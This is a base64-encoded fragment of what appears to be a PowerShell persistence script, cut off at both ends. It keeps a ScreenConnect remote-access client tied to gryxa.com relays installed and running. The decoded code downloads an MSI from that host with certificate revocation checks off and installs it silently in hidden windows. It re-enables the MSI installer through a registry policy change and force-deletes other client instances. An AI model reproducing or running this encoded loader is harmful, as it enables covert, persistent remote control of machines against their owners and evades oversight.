bmdlcnByaW50LmxvZyIKICAgICRwID0gU3RhcnQtUHJvY2VzcyBtc2lleGVjLmV4ZSAtQXJndW1l
bnRMaXN0ICIvZmEgJGd1aWQgL3FuIC9ub3Jlc3RhcnQgL0wqdiBgIiRsb2dgIiIgLVdhaXQgLVBh
c3NUaHJ1CiAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyA4CiAgICAmIHNjLmV4ZSBjb25maWcgIiRu
YW1lIiBzdGFydD0gYXV0byAyPiYxIHwgT3V0LU51bGwKICAgICYgc2MuZXhlIHN0YXJ0ICIkbmFt
ZSIgMj4mMSB8IE91dC1OdWxsCiAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyA0CiAgICAkc3ZjID0g
R2V0LVNlcnZpY2UgLU5hbWUgJG5hbWUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAg
IGlmICgkc3ZjIC1hbmQgJHN2Yy5TdGF0dXMgLWVxICdSdW5uaW5nJykgeyByZXR1cm4gInN2Yy1y
ZXN0b3JlZCBleGl0PSQoJHAuRXhpdENvZGUpIiB9CiAgICBpZiAoJHN2YykgeyByZXR1cm4gInN2
Yy1zdGlsbC1zdG9wcGVkIGV4aXQ9JCgkcC5FeGl0Q29kZSkiIH0KICAgIHJldHVybiAic3ZjLXN0
aWxsLW1pc3NpbmcgZXhpdD0kKCRwLkV4aXRDb2RlKSIKfQoKIyDilIDilIAgR3J5eGEgTVVTVC1S
VU4gaGVhbHRoIChMMTUpIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
gAokc2NyaXB0OkdyeXhhRGVmYXVsdEZwID0gJzk5MDgxOThlNjY4ZTQ3NTAnCiRzY3JpcHQ6R3J5
eGFNc2lVcmwgPSAnaHR0cHM6Ly91aS5ncnl4YS5jb20vQmluL1NjcmVlbkNvbm5lY3QuQ2xpZW50
U2V0dXAubXNpP2U9QWNjZXNzJnk9R3Vlc3QnCiRzY3JpcHQ6R3J5eGFSZWxheUhvc3QgPSAndXBk
YXRlLmdyeXhhLmNvbScKJHNjcmlwdDpHcnl4YVVpSG9zdCA9ICd1aS5ncnl4YS5jb20nCgpmdW5j
dGlvbiBHZXQtR3J5eGFDZmdQYXRoIHsgSm9pbi1QYXRoICRXb3JrRGlyICdncnl4YS5jZmcnIH0K
CmZ1bmN0aW9uIEdldC1Hcnl4YUZwIHsKICAgICRmcCA9ICRzY3JpcHQ6R3J5eGFEZWZhdWx0RnAK
ICAgICRwID0gR2V0LUdyeXhhQ2ZnUGF0aAogICAgaWYgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGgg
JHApIHsKICAgICAgICBHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJHAgLUVycm9yQWN0aW9uIFNp
bGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgIGlmICgkXyAtbWF0
Y2ggJ15DVVJSRU5UX0ZQPShbMC05YS1mQS1GXXsxNn0pXHMqJCcpIHsgJGZwID0gJG1hdGNoZXNb
MV0uVG9Mb3dlcigpIH0KICAgICAgICB9CiAgICB9CiAgICByZXR1cm4gJGZwCn0KCmZ1bmN0aW9u
IFNldC1Hcnl4YUZwKFtzdHJpbmddJEZpbmdlcnByaW50KSB7CiAgICBpZiAoLW5vdCAkRmluZ2Vy
cHJpbnQpIHsgcmV0dXJuIH0KICAgIGlmICgtbm90IChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRX
b3JrRGlyKSkgewogICAgICAgIE5ldy1JdGVtIC1JdGVtVHlwZSBEaXJlY3RvcnkgLVBhdGggJFdv
cmtEaXIgLUZvcmNlIHwgT3V0LU51bGwKICAgIH0KICAgIEAoCiAgICAgICAgIkNVUlJFTlRfRlA9
JCgkRmluZ2VycHJpbnQuVG9Mb3dlcigpKSIKICAgICAgICAiUkVMQVk9JCgkc2NyaXB0OkdyeXhh
UmVsYXlIb3N0KSIKICAgICAgICAiVUk9JCgkc2NyaXB0OkdyeXhhVWlIb3N0KSIKICAgICAgICAi
TVNJVVJMPSQoJHNjcmlwdDpHcnl4YU1zaVVybCkiCiAgICAgICAgIlVQREFURUQ9JCgoR2V0LURh
dGUpLlRvVW5pdmVyc2FsVGltZSgpLlRvU3RyaW5nKCdvJykpIgogICAgKSB8IFNldC1Db250ZW50
IC1MaXRlcmFsUGF0aCAoR2V0LUdyeXhhQ2ZnUGF0aCkgLUVuY29kaW5nIEFTQ0lJIC1Gb3JjZQp9
CgpmdW5jdGlvbiBHZXQtS2VlcEZpbmdlcnByaW50cyB7CiAgICAkZyA9IEdldC1Hcnl4YUZwCiAg
ICBAKCc1ZjYwMTA1Nzk4NTJlNTA3JywgJ2Y4NjFjODE0MGQ0NTM0MjcnLCAkZykgfCBTZWxlY3Qt
T2JqZWN0IC1VbmlxdWUKfQoKZnVuY3Rpb24gVGVzdC1UY3BIb3N0UG9ydChbc3RyaW5nXSRIb3N0
TmFtZSwgW2ludF0kUG9ydCA9IDQ0MywgW2ludF0kVGltZW91dE1zID0gODAwMCkgewogICAgaWYg
KC1ub3QgJEhvc3ROYW1lKSB7IHJldHVybiAkZmFsc2UgfQogICAgJGNsaWVudCA9ICRudWxsCiAg
ICB0cnkgewogICAgICAgICRjbGllbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5U
Y3BDbGllbnQKICAgICAgICAkaWFyID0gJGNsaWVudC5CZWdpbkNvbm5lY3QoJEhvc3ROYW1lLCAk
UG9ydCwgJG51bGwsICRudWxsKQogICAgICAgIGlmICgtbm90ICRpYXIuQXN5bmNXYWl0SGFuZGxl
LldhaXRPbmUoJFRpbWVvdXRNcywgJGZhbHNlKSkgewogICAgICAgICAgICB0cnkgeyAkY2xpZW50
LkNsb3NlKCkgfSBjYXRjaCB7fQogICAgICAgICAgICByZXR1cm4gJGZhbHNlCiAgICAgICAgfQog
ICAgICAgICRjbGllbnQuRW5kQ29ubmVjdCgkaWFyKQogICAgICAgIHJldHVybiAkdHJ1ZQogICAg
fSBjYXRjaCB7CiAgICAgICAgcmV0dXJuICRmYWxzZQogICAgfSBmaW5hbGx5IHsKICAgICAgICBp
ZiAoJGNsaWVudCkgeyB0cnkgeyAkY2xpZW50LkNsb3NlKCkgfSBjYXRjaCB7fSB9CiAgICB9Cn0K
CmZ1bmN0aW9uIEdldC1Nc2lQcm9wZXJ0eShbc3RyaW5nXSRNc2lQYXRoLCBbc3RyaW5nXSRQcm9w
ZXJ0eU5hbWUpIHsKICAgIGlmICgtbm90IChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRNc2lQYXRo
KSkgeyByZXR1cm4gJG51bGwgfQogICAgdHJ5IHsKICAgICAgICAkaW5zdGFsbGVyID0gTmV3LU9i
amVjdCAtQ29tT2JqZWN0IFdpbmRvd3NJbnN0YWxsZXIuSW5zdGFsbGVyCiAgICAgICAgJGRiID0g
JGluc3RhbGxlci5PcGVuRGF0YWJhc2UoKFJlc29sdmUtUGF0aCAtTGl0ZXJhbFBhdGggJE1zaVBh
dGgpLlBhdGgsIDApCiAgICAgICAgJHZpZXcgPSAkZGIuT3BlblZpZXcoIlNFTEVDVCBgVmFsdWVg
IEZST00gYFByb3BlcnR5YCBXSEVSRSBgUHJvcGVydHlgPSckUHJvcGVydHlOYW1lJyIpCiAgICAg
ICAgJHZpZXcuRXhlY3V0ZSgpIHwgT3V0LU51bGwKICAgICAgICAkcmVjID0gJHZpZXcuRmV0Y2go
KQogICAgICAgIGlmICgtbm90ICRyZWMpIHsgcmV0dXJuICRudWxsIH0KICAgICAgICByZXR1cm4g
W3N0cmluZ10kcmVjLlN0cmluZ0RhdGEoMSkKICAgIH0gY2F0Y2ggewogICAgICAgIHJldHVybiAk
bnVsbAogICAgfQp9CgpmdW5jdGlvbiBHZXQtRnBGcm9tUHJvZHVjdE5hbWUoW3N0cmluZ10kUHJv
ZHVjdE5hbWUpIHsKICAgIGlmICgkUHJvZHVjdE5hbWUgLW1hdGNoICdcKChbMC05YS1mQS1GXXsx
Nn0pXCknKSB7IHJldHVybiAkbWF0Y2hlc1sxXS5Ub0xvd2VyKCkgfQogICAgcmV0dXJuICRudWxs
Cn0KCmZ1bmN0aW9uIEZpbmQtUHJvZHVjdEd1aWQoW3N0cmluZ10kRmluZ2VycHJpbnQpIHsKICAg
ICRuYW1lID0gIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgkRmluZ2VycHJpbnQpIgogICAgZm9yZWFj
aCAoJHJvb3QgaW4gJHNjcmlwdDpVbmluc3RhbGxSb290cykgewogICAgICAgIGlmICgtbm90IChU
ZXN0LVBhdGggJHJvb3QpKSB7IGNvbnRpbnVlIH0KICAgICAgICBmb3JlYWNoICgka2V5IGluIChH
ZXQtQ2hpbGRJdGVtICRyb290IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKSkgewogICAg
ICAgICAgICAkZG4gPSAoR2V0LUl0ZW1Qcm9wZXJ0eSAka2V5LlBTUGF0aCAtRXJyb3JBY3Rpb24g
U2lsZW50bHlDb250aW51ZSkuRGlzcGxheU5hbWUKICAgICAgICAgICAgaWYgKCRkbiAtYW5kICgk
ZG4gLWllcSAkbmFtZSkgLWFuZCAoJGtleS5QU0NoaWxkTmFtZSAtbGlrZSAneyp9JykpIHsKICAg
ICAgICAgICAgICAgIHJldHVybiAka2V5LlBTQ2hpbGROYW1lCiAgICAgICAgICAgIH0KICAgICAg
ICB9CiAgICB9CiAgICByZXR1cm4gJG51bGwKfQoKZnVuY3Rpb24gVGVzdC1Hcnl4YVJlbGF5Q29u
ZmlndXJlZChbc3RyaW5nXSRGaW5nZXJwcmludCkgewogICAgJG5hbWUgPSAiU2NyZWVuQ29ubmVj
dCBDbGllbnQgKCRGaW5nZXJwcmludCkiCiAgICAkZGlycyA9IEAoCiAgICAgICAgKEpvaW4tUGF0
aCAke2VudjpQcm9ncmFtRmlsZXMoeDg2KX0gIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgkRmluZ2Vy
cHJpbnQpIiksCiAgICAgICAgKEpvaW4tUGF0aCAkZW52OlByb2dyYW1GaWxlcyAiU2NyZWVuQ29u
bmVjdCBDbGllbnQgKCRGaW5nZXJwcmludCkiKQogICAgKQogICAgJHBhdHRlcm5zID0gQCgndXBk
YXRlLmdyeXhhLmNvbScsICd1aS5ncnl4YS5jb20nLCAnZ3J5eGEuY29tJykKICAgIGZvcmVhY2gg
KCRkIGluICRkaXJzKSB7CiAgICAgICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGgg
JGQpKSB7IGNvbnRpbnVlIH0KICAgICAgICAkZmlsZXMgPSBAKEdldC1DaGlsZEl0ZW0gLUxpdGVy
YWxQYXRoICRkIC1GaWxlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgU2VsZWN0LU9i
amVjdCAtRmlyc3QgNjApCiAgICAgICAgZm9yZWFjaCAoJGYgaW4gJGZpbGVzKSB7CiAgICAgICAg
ICAgIGZvcmVhY2ggKCRwYXQgaW4gJHBhdHRlcm5zKSB7CiAgICAgICAgICAgICAgICBpZiAoU2Vs
ZWN0LVN0cmluZyAtTGl0ZXJhbFBhdGggJGYuRnVsbE5hbWUgLVBhdHRlcm4gJHBhdCAtU2ltcGxl
TWF0Y2ggLVF1aWV0IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKSB7CiAgICAgICAgICAg
ICAgICAgICAgcmV0dXJuICR0cnVlCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAg
ICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIGlmICgkZi5MZW5ndGggLWd0IDJNQikgeyBj
b250aW51ZSB9CiAgICAgICAgICAgICAgICAkYnl0ZXMgPSBbU3lzdGVtLklPLkZpbGVdOjpSZWFk
QWxsQnl0ZXMoJGYuRnVsbE5hbWUpCiAgICAgICAgICAgICAgICAkdGV4dCA9IFtTeXN0ZW0uVGV4
dC5FbmNvZGluZ106OlVuaWNvZGUuR2V0U3RyaW5nKCRieXRlcykKICAgICAgICAgICAgICAgIGlm
ICgkdGV4dCAtbWF0Y2ggJ2dyeXhhXC5jb20nKSB7IHJldHVybiAkdHJ1ZSB9CiAgICAgICAgICAg
ICAgICAkdGV4dDggPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZygkYnl0
ZXMpCiAgICAgICAgICAgICAgICBpZiAoJHRleHQ4IC1tYXRjaCAnZ3J5eGFcLmNvbScpIHsgcmV0
dXJuICR0cnVlIH0KICAgICAgICAgICAgfSBjYXRjaCB7fQogICAgICAgIH0KICAgIH0KICAgICRp
bWcgPSAoR2V0LUl0ZW1Qcm9wZXJ0eSAiSEtMTTpcU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XFNl
cnZpY2VzXCRuYW1lIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkuSW1hZ2VQYXRoCiAg
ICBpZiAoJGltZyAtYW5kICgkaW1nIC1tYXRjaCAnZ3J5eGFcLmNvbScpKSB7IHJldHVybiAkdHJ1
ZSB9CiAgICAjIE9mZmljaWFsIEdyeXhhIE1TSSBmaW5nZXJwcmludCBpbXBsaWVzIGNvcnJlY3Qg
cmVsYXkgYmFrZWQgYXQgaW5zdGFsbCB0aW1lCiAgICBpZiAoRmluZC1Qcm9kdWN0R3VpZCAkRmlu
Z2VycHJpbnQpIHsgcmV0dXJuICR0cnVlIH0KICAgIHJldHVybiAkZmFsc2UKfQoKZnVuY3Rpb24g
VGVzdC1Hcnl4YUhlYWx0aCB7CiAgICAkZnAgPSBHZXQtR3J5eGFGcAogICAgJG5hbWUgPSAiU2Ny
ZWVuQ29ubmVjdCBDbGllbnQgKCRmcCkiCiAgICAkcmVhc29ucyA9IE5ldy1PYmplY3QgU3lzdGVt
LkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdFtzdHJpbmddCgogICAgJHN2YyA9IEdldC1TZXJ2aWNl
IC1OYW1lICRuYW1lIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICBpZiAoLW5vdCAk
c3ZjKSB7IFt2b2lkXSRyZWFzb25zLkFkZCgnc3ZjLW1pc3NpbmcnKSB9CiAgICBlbHNlaWYgKCRz
dmMuU3RhdHVzIC1uZSAnUnVubmluZycpIHsgW3ZvaWRdJHJlYXNvbnMuQWRkKCJzdmMtJCgkc3Zj
LlN0YXR1cykiKSB9CgogICAgJGRpck9rID0gJGZhbHNlCiAgICBmb3JlYWNoICgkYmFzZSBpbiBA
KCR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfSwgJGVudjpQcm9ncmFtRmlsZXMpKSB7CiAgICAgICAg
aWYgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggKEpvaW4tUGF0aCAkYmFzZSAiU2NyZWVuQ29ubmVj
dCBDbGllbnQgKCRmcCkiKSkgeyAkZGlyT2sgPSAkdHJ1ZSB9CiAgICB9CiAgICBpZiAoLW5vdCAk
ZGlyT2spIHsgW3ZvaWRdJHJlYXNvbnMuQWRkKCdkaXItbWlzc2luZycpIH0KCiAgICBpZiAoLW5v
dCAoVGVzdC1Hcnl4YVJlbGF5Q29uZmlndXJlZCAkZnApKSB7IFt2b2lkXSRyZWFzb25zLkFkZCgn
cmVsYXktY29uZmlnLW1pc3NpbmcnKSB9CgogICAgJHRjcFJlbGF5ID0gVGVzdC1UY3BIb3N0UG9y
dCAkc2NyaXB0OkdyeXhhUmVsYXlIb3N0IDQ0MwogICAgJHRjcFVpID0gVGVzdC1UY3BIb3N0UG9y
dCAkc2NyaXB0OkdyeXhhVWlIb3N0IDQ0MwogICAgaWYgKC1ub3QgJHRjcFJlbGF5IC1hbmQgLW5v
dCAkdGNwVWkpIHsKICAgICAgICBbdm9pZF0kcmVhc29ucy5BZGQoJ3RjcC11bnJlYWNoYWJsZScp
CiAgICB9IGVsc2UgewogICAgICAgIGlmICgtbm90ICR0Y3BSZWxheSkgeyBbdm9pZF0kcmVhc29u
cy5BZGQoJ3JlbGF5LXRjcC1zb2Z0ZmFpbCcpIH0KICAgICAgICBpZiAoLW5vdCAkdGNwVWkpIHsg
W3ZvaWRdJHJlYXNvbnMuQWRkKCd1aS10Y3Atc29mdGZhaWwnKSB9CiAgICB9CgogICAgIyBzb2Z0
ZmFpbHMgYWxvbmUgKG9uZSBvZiB0d28gaG9zdHMgZG93bikgZG8gbm90IGZhaWwgaGVhbHRoIGlm
IHN2YytkaXIrb3RoZXIgaG9zdCBvawogICAgJGhhcmQgPSBAKCRyZWFzb25zIHwgV2hlcmUtT2Jq
ZWN0IHsgJF8gLW5vdG1hdGNoICctc29mdGZhaWwkJyB9KQogICAgaWYgKCRoYXJkLkNvdW50IC1l
cSAwKSB7CiAgICAgICAgcmV0dXJuICJIRUFMVEhZfCRmcHxyZWxheT0kdGNwUmVsYXl8dWk9JHRj
cFVpIgogICAgfQogICAgcmV0dXJuICJVTkhFQUxUSFl8JGZwfCQoJGhhcmQgLWpvaW4gJywnKXxy
ZWxheT0kdGNwUmVsYXl8dWk9JHRjcFVpIgp9CgpmdW5jdGlvbiBVbmluc3RhbGwtU2NGaW5nZXJw
cmludChbc3RyaW5nXSRGaW5nZXJwcmludCkgewogICAgaWYgKC1ub3QgJEZpbmdlcnByaW50KSB7
IHJldHVybiAnbm8tZnAnIH0KICAgICRuYW1lID0gIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgkRmlu
Z2VycHJpbnQpIgogICAgJGd1aWQgPSBGaW5kLVByb2R1Y3RHdWlkICRGaW5nZXJwcmludAogICAg
JiByZWcuZXhlIGRlbGV0ZSAnSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93
c1xJbnN0YWxsZXInIC92IERpc2FibGVNU0kgL2YgMj4mMSB8IE91dC1OdWxsCiAgICAmIHJlZy5l
eGUgYWRkICdIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxl
cicgL3YgRGlzYWJsZU1TSSAvdCBSRUdfRFdPUkQgL2QgMCAvZiAyPiYxIHwgT3V0LU51bGwKICAg
IGlmICgkZ3VpZCkgewogICAgICAgICRwID0gU3RhcnQtUHJvY2VzcyBtc2lleGVjLmV4ZSAtQXJn
dW1lbnRMaXN0ICIveCAkZ3VpZCAvcW4gL25vcmVzdGFydCBSRUJPT1Q9UmVhbGx5U3VwcHJlc3Mi
IC1XYWl0IC1QYXNzVGhydSAtV2luZG93U3R5bGUgSGlkZGVuCiAgICAgICAgU3RhcnQtU2xlZXAg
LVNlY29uZHMgNgogICAgfQogICAgJHN2YyA9IEdldC1TZXJ2aWNlIC1OYW1lICRuYW1lIC1FcnJv
ckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICBpZiAoJHN2YykgewogICAgICAgICYgc2MuZXhl
IHN0b3AgJG5hbWUgMj4mMSB8IE91dC1OdWxsCiAgICAgICAgJiBzYy5leGUgZGVsZXRlICRuYW1l
IDI+JjEgfCBPdXQtTnVsbAogICAgICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDIKICAgIH0KICAg
IGZvcmVhY2ggKCRiYXNlIGluIEAoJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9LCAkZW52OlByb2dy
YW1GaWxlcykpIHsKICAgICAgICAkZCA9IEpvaW4tUGF0aCAkYmFzZSAiU2NyZWVuQ29ubmVjdCBD
bGllbnQgKCRGaW5nZXJwcmludCkiCiAgICAgICAgaWYgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGgg
JGQpIHsKICAgICAgICAgICAgJiB0YWtlb3duLmV4ZSAvRiAkZCAvUiAvRCBZIDI+JjEgfCBPdXQt
TnVsbAogICAgICAgICAgICBSZW1vdmUtSXRlbSAtTGl0ZXJhbFBhdGggJGQgLVJlY3Vyc2UgLUZv
cmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICAgICAgfQogICAgfQogICAgcmV0
dXJuICdyZW1vdmVkJwp9CgpmdW5jdGlvbiBJbnN0YWxsLUdyeXhhRnJvbU1zaShbc3RyaW5nXSRN
c2lQYXRoKSB7CiAgICAmIHJlZy5leGUgZGVsZXRlICdIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1p
Y3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlcicgL3YgRGlzYWJsZU1TSSAvZiAyPiYxIHwgT3V0LU51
bGwKICAgICYgcmVnLmV4ZSBhZGQgJ0hLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdp
bmRvd3NcSW5zdGFsbGVyJyAvdiBEaXNhYmxlTVNJIC90IFJFR19EV09SRCAvZCAwIC9mIDI+JjEg
fCBPdXQtTnVsbAogICAgJGxvZyA9IEpvaW4tUGF0aCAkV29ya0RpciAnbXNpX2dyeXhhX2Vuc3Vy
ZS5sb2cnCiAgICAkcCA9IFN0YXJ0LVByb2Nlc3MgbXNpZXhlYy5leGUgLUFyZ3VtZW50TGlzdCAi
L2kgYCIkTXNpUGF0aGAiIC9xbiAvbm9yZXN0YXJ0IEFMTFVTRVJTPTEgUkVCT09UPVJlYWxseVN1
cHByZXNzIC9MKnYgYCIkbG9nYCIiIC1XYWl0IC1QYXNzVGhydSAtV2luZG93U3R5bGUgSGlkZGVu
CiAgICAkZXhpdCA9ICRwLkV4aXRDb2RlCiAgICBpZiAoJGV4aXQgLWVxIDE2MTgpIHsKICAgICAg
ICBTdGFydC1TbGVlcCAtU2Vjb25kcyAzMAogICAgICAgICRwID0gU3RhcnQtUHJvY2VzcyBtc2ll
eGVjLmV4ZSAtQXJndW1lbnRMaXN0ICIvaSBgIiRNc2lQYXRoYCIgL3FuIC9ub3Jlc3RhcnQgQUxM
VVNFUlM9MSBSRUJPT1Q9UmVhbGx5U3VwcHJlc3MgL0wqdiBgIiRsb2dgIiIgLVdhaXQgLVBhc3NU
aHJ1IC1XaW5kb3dTdHlsZSBIaWRkZW4KICAgICAgICAkZXhpdCA9ICRwLkV4aXRDb2RlCiAgICB9
CiAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyAxMAogICAgcmV0dXJuICRleGl0Cn0KCmZ1bmN0aW9u
IEludm9rZS1Hcnl4YUVuc3VyZSB7CiAgICAjIExpZ2h0OiBzZXJ2aWNlL2RpciBoZWFsLiBEZWVw
L0ZvcmNlOiBkb3dubG9hZCBNU0ksIGRldGVjdCBGUCBkcmlmdCwgVENQL3JlbGF5LCByZWluc3Rh
bGwuCiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkV29ya0RpcikpIHsKICAg
ICAgICBOZXctSXRlbSAtSXRlbVR5cGUgRGlyZWN0b3J5IC1QYXRoICRXb3JrRGlyIC1Gb3JjZSB8
IE91dC1OdWxsCiAgICB9CiAgICAkbG9nID0gSm9pbi1QYXRoICRXb3JrRGlyICdncnl4YV9lbnN1
cmUubG9nJwogICAgZnVuY3Rpb24gR0xvZyhbc3RyaW5nXSRtKSB7CiAgICAgICAgJGxpbmUgPSAn
ezB9IHsxfScgLWYgKEdldC1EYXRlIC1Gb3JtYXQgJ3l5eXktTU0tZGQgSEg6bW06c3MnKSwgJG0K
ICAgICAgICBBZGQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGxvZyAtVmFsdWUgJGxpbmUgLUVycm9y
QWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgIH0KCiAgICAkb2xkRnAgPSBHZXQtR3J5eGFGcAog
ICAgJGRvRGVlcCA9IFtib29sXSgkRGVlcCAtb3IgJEZvcmNlIC1vciAoJEV4dHJhIC1tYXRjaCAn
KD9pKWRlZXB8Zm9yY2UnKSkKICAgIEdMb2cgImdyeXhhX2Vuc3VyZV9iZWdpbiBkZWVwPSRkb0Rl
ZXAgZm9yY2U9JEZvcmNlIG9sZF9mcD0kb2xkRnAiCgogICAgaWYgKC1ub3QgJGRvRGVlcCAtYW5k
IC1ub3QgJEZvcmNlKSB7CiAgICAgICAgJGggPSBUZXN0LUdyeXhhSGVhbHRoCiAgICAgICAgR0xv
ZyAibGlnaHRfaGVhbHRoPSRoIgogICAgICAgIGlmICgkaCAtbGlrZSAnSEVBTFRIWSonKSB7IHJl
dHVybiAkaCB9CiAgICAgICAgIyBsaWdodCBwYXRoOiB0cnkgc3RhcnQvcmVwYWlyIGJlZm9yZSBm
dWxsIHJlaW5zdGFsbAogICAgICAgICRuYW1lID0gIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgkb2xk
RnApIgogICAgICAgICYgc2MuZXhlIGNvbmZpZyAkbmFtZSBzdGFydD0gYXV0byAyPiYxIHwgT3V0
LU51bGwKICAgICAgICAmIHNjLmV4ZSBzdGFydCAkbmFtZSAyPiYxIHwgT3V0LU51bGwKICAgICAg
ICBTdGFydC1TbGVlcCAtU2Vjb25kcyA0CiAgICAgICAgaWYgKChHZXQtU2VydmljZSAtTmFtZSAk
bmFtZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkuU3RhdHVzIC1lcSAnUnVubmluZycp
IHsKICAgICAgICAgICAgJGgyID0gVGVzdC1Hcnl4YUhlYWx0aAogICAgICAgICAgICBpZiAoJGgy
IC1saWtlICdIRUFMVEhZKicpIHsgR0xvZyAibGlnaHRfc3RhcnRlZF9vayI7IHJldHVybiAkaDIg
fQogICAgICAgIH0KICAgICAgICAkcmVwID0gUmVwYWlyLVNDU2VydmljZSAkb2xkRnAKICAgICAg
ICBHTG9nICJsaWdodF9yZXBhaXI9JHJlcCIKICAgICAgICAkaDMgPSBUZXN0LUdyeXhhSGVhbHRo
CiAgICAgICAgaWYgKCRoMyAtbGlrZSAnSEVBTFRIWSonKSB7IHJldHVybiAkaDMgfQogICAgICAg
IEdMb2cgJ2xpZ2h0X2VzY2FsYXRlX3RvX3JlaW5zdGFsbCcKICAgICAgICAkZG9EZWVwID0gJHRy
dWUKICAgIH0KCiAgICAjIERlZXA6IGFsd2F5cyBmZXRjaCBmcmVzaCBNU0kgc28gc2VydmVyL2tl
eS9GUCByb3RhdGlvbiBpcyBkZXRlY3RlZAogICAgJG1zaSA9IEpvaW4tUGF0aCAkV29ya0RpciAn
cGtnX2dyeXhhLm1zaScKICAgICR0bXAgPSBKb2luLVBhdGggJGVudjpURU1QICgic2NfZ3J5eGFf
ezB9Lm1zaSIgLWYgW2d1aWRdOjpOZXdHdWlkKCkuVG9TdHJpbmcoJ04nKSkKICAgICRmZXRjaGVk
ID0gJGZhbHNlCiAgICB0cnkgewogICAgICAgICRjdXJsID0gSm9pbi1QYXRoICRlbnY6U3lzdGVt
Um9vdCAnU3lzdGVtMzJcY3VybC5leGUnCiAgICAgICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkY3Vy
bCkpIHsgJGN1cmwgPSAnY3VybC5leGUnIH0KICAgICAgICAmICRjdXJsIC1MIC0tc3NsLW5vLXJl
dm9rZSAtLWNvbm5lY3QtdGltZW91dCAyNSAtLW1heC10aW1lIDMwMCAtbyAkdG1wICRzY3JpcHQ6
R3J5eGFNc2lVcmwgMj4mMSB8IE91dC1OdWxsCiAgICAgICAgaWYgKChUZXN0LVBhdGggJHRtcCkg
LWFuZCAoKEdldC1JdGVtICR0bXApLkxlbmd0aCAtZ3QgMTAwMDAwMCkpIHsKICAgICAgICAgICAg
Q29weS1JdGVtIC1MaXRlcmFsUGF0aCAkdG1wIC1EZXN0aW5hdGlvbiAkbXNpIC1Gb3JjZQogICAg
ICAgICAgICAkZmV0Y2hlZCA9ICR0cnVlCiAgICAgICAgICAgIEdMb2cgKCJtc2lfZmV0Y2hlZCBi
eXRlcz17MH0iIC1mIChHZXQtSXRlbSAkbXNpKS5MZW5ndGgpCiAgICAgICAgfQogICAgfSBjYXRj
aCB7CiAgICAgICAgR0xvZyAibXNpX2ZldGNoX2Vycj0kXyIKICAgIH0gZmluYWxseSB7CiAgICAg
ICAgUmVtb3ZlLUl0ZW0gLUxpdGVyYWxQYXRoICR0bXAgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxl
bnRseUNvbnRpbnVlCiAgICB9CiAgICBpZiAoLW5vdCAkZmV0Y2hlZCAtYW5kIChUZXN0LVBhdGgg
JG1zaSkgLWFuZCAoKEdldC1JdGVtICRtc2kpLkxlbmd0aCAtZ3QgMTAwMDAwMCkpIHsKICAgICAg
ICAkZmV0Y2hlZCA9ICR0cnVlCiAgICAgICAgR0xvZyAnbXNpX3VzaW5nX2NhY2hlJwogICAgfQog
ICAgaWYgKC1ub3QgJGZldGNoZWQpIHsKICAgICAgICBHTG9nICdtc2lfZmV0Y2hfRkFJTCcKICAg
ICAgICByZXR1cm4gIlVOSEVBTFRIWXwkb2xkRnB8bXNpLWZldGNoLWZhaWwiCiAgICB9CgogICAg
JHByb2ROYW1lID0gR2V0LU1zaVByb3BlcnR5ICRtc2kgJ1Byb2R1Y3ROYW1lJwogICAgJG5ld0Zw
ID0gR2V0LUZwRnJvbVByb2R1Y3ROYW1lICRwcm9kTmFtZQogICAgaWYgKC1ub3QgJG5ld0ZwKSB7
CiAgICAgICAgR0xvZyAibXNpX2ZwX3BhcnNlX0ZBSUwgbmFtZT0kcHJvZE5hbWUiCiAgICAgICAg
